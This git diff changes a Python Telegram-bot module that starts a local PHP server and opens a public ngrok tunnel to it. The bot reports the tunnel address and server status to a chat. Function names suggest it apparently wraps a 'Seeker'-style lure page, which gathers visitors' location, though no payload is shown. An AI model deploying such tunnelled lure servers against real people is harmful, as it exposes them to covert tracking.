@@ -2,29 +2,30 @@ import requests
 import subprocess
 import threading
 import time
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+from test import get_ngrok_http_address  # Import the seeker_data_parser function
+
 
 def run_ngrok(chat_id, bot):
     try:
-        # Run ngrok using subprocess
-        ngrok_process = subprocess.Popen(["ngrok", "http", "4001"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        ngrok_process = subprocess.Popen(["ngrok", "http", "4001"])
+        time.sleep(1)
+        get_ngrok_http_address(chat_id, bot)
+        ngrok_process.wait()  # Wait for Ngrok to start and expose the tunnel
 
-        # Read ngrok's output in a separate thread
-        def read_ngrok_output():
-            
-            while True:
-                ngrok_output = ngrok_process.stdout.readline().decode().strip()
-                if "Forwarding" in ngrok_output:
-                    
-                    http_address = ngrok_output.split(' ')[1]
-                    bot.send_message(chat_id, f"Ngrok HTTP address: {http_address}")
-
-        ngrok_thread = threading.Thread(target=read_ngrok_output)
-        ngrok_thread.start()
-
-        ngrok_process.wait()  # Wait for ngrok to start
 
     except Exception as e:
-         bot.send_message(chat_id, f"An error occurred: {str(e)}")
+        print(f"An error occurred: {str(e)}")
+
+
+def stop_ngrok():
+    try:
+        # Find and terminate the ngrok process
+        subprocess.run(["pkill", "ngrok"], check=True)
+        print("Ngrok has been stopped.")
+    except subprocess.CalledProcessError as e:
+        print(f"An error occurred: {str(e)}")
+
 
 def seekServer(LOG_FILE, port, SITE, subp, sleep, cl_quit, bot, chat_id):
     print()
@@ -37,7 +38,8 @@ def seekServer(LOG_FILE, port, SITE, subp, sleep, cl_quit, bot, chat_id):
         proc = subp.Popen(cmd, stdout=phplog, stderr=phplog)
         time.sleep(3)
         phplog.seek(0)
-        run_ngrok_thread = threading.Thread(target=run_ngrok, args=(chat_id, bot))
+        run_ngrok_thread = threading.Thread(
+            target=run_ngrok, args=(chat_id, bot))
         run_ngrok_thread.start()
 
         if 'Address already in use' in phplog.readline():
@@ -48,14 +50,14 @@ def seekServer(LOG_FILE, port, SITE, subp, sleep, cl_quit, bot, chat_id):
 
             if php_sc == 200:
                 if preoc:
-                    
                     print(f'[ ✔ ]')
-                    print(f'[!] Server is already running!')
+                    bot.send_message(chat_id, f'[✘] Server is already running!')
                     print()
                 else:
                     bot.send_message(chat_id, "✅ Сервер запущен! ✅")
                     print(f'[ ✔ ]')
                     print()
+
             else:
                 print(f'[ Status : {php_sc} ]')
                 cl_quit(proc)
